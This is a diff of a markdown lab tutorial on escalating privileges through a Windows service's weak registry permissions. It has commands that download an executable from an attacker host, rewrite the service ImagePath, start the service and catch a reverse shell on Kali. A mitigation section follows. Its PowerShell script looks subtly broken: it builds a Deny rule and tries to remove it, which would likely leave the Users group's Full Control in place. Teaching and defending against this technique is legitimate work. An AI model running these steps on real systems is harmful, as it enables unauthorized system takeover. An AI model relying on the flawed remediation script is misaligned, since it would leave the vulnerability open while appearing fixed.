@@ -128,7 +128,7 @@ iwr -Uri http://<ip>:<port>/Service4.exe -Outfile C:\Windows\Tasks\Service4.exe
 4) Change the image path for service:
 
 ```
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\Servic4.exe" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\Tasks\Service4.exe" /f
 ```
 
 5) Start the service with the following command or reboot the machine:
@@ -139,4 +139,47 @@ sc start "Vulnerable Service 4"
 
 Outcome:
 
-![]
+![Weak-Registry-Permissions-Exploitation](/Pictures/Weak-Registry-Permissions-Exploitation-2.png)
+
+6) Verify the reverse shell on your Kali machine:
+
+![Weak-Registry-Permissions-Reverse-Shell](/Pictures/Weak-Registry-Permissions-Reverse-Shell.png)
+
+## Mitigation
+
+To defend against Weak Regisrty Permissions vulnerabilities, adjust permissions on Regisrty hives initiated through this mechanism. This limits unauthorized access and strengthens security measures:
+
+1) Open Registry panel with `regedit` command and navigate to 'Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4'.
+
+2) Right click on "Vulnerable Service 4" and choose the "permissions" option.
+
+3) Remove the checkmark from the 'Full Control' box assigned to 'Users,' then click the 'OK' button.
+
+However, you can use the following PowerShell script:
+
+```
+# Define the registry key path
+$regKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Vulnerable Service 4"
+
+# Get the current ACL (Access Control List) for the registry key
+$acl = Get-Acl -Path $regKey
+
+# Specify the account and access rights to be removed
+$account = "BUILTIN\Users"
+$accessRights = [System.Security.AccessControl.RegistryRights]::FullControl
+
+# Create a new access rule to remove FullControl
+$accessRule = New-Object System.Security.AccessControl.RegistryAccessRule($account, $accessRights, "Deny")
+
+# Remove the access rule from the ACL
+$acl.RemoveAccessRule($accessRule)
+
+# Set the modified ACL back to the registry key
+Set-Acl -Path $regKey -AclObject $acl
+```
+
+## References
+
+- [Windows registry information for advanced users Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users)
+- [About Registry Microsoft](https://learn.microsoft.com/en-us/windows/win32/sysinfo/about-the-registry)
+- [Registry Key Security and Access Rights Microsoft](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)
